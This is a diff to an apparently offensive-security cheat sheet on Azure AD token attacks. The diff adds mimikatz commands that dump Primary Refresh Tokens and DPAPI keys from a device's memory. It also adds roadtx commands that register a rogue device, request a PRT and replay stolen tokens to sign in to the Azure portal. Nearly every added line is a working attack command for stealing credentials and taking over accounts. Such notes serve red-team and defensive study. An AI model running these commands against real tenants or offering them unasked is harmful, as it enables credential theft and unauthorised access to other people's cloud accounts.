@@ -95,6 +95,16 @@ Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9
     ```
 
 
+### Extract PRT v1
+
+```ps1
+mimikatz # sekurlsa::cloudap
+mimikatz # sekurlsa::dpapi
+mimikatz # dpapi::cloudapkd /keyvalue:<key-value> /unprotect
+roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url https://portal.azure.com
+```
+
+
 ### Extract PRT on Device with TPM
 
 * No method known to date.
@@ -103,11 +113,17 @@ Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9
 ### Generate a PRT by registering a device
 
 ```ps1
-roadtx interactiveauth -u user.lastname@domain.local -p password123 -r devicereg
-roadtx device -n devicename
-roadtx prt -u user.lastname@domain.local -p password123 –-key-pem devicename.key –-cert-pem devicename.pem
-roadtx prtenrich –prt roadtx.prt
-roadtx prt -u user.lastname@domain.local -p password123 –-key-pem devicename.key –-cert-pem devicename.pem -r 0.AVAApQL<snip>
+# Get correct token audience
+roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file
+
+# Registering device
+roadtx device -a register -n <device-name>
+
+# Request PRT 
+roadtx prt --refresh-token <refresh-token> -c <device-name>.pem -k <device-name>.key
+
+# Use a PRT
+roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
 ```
 
 
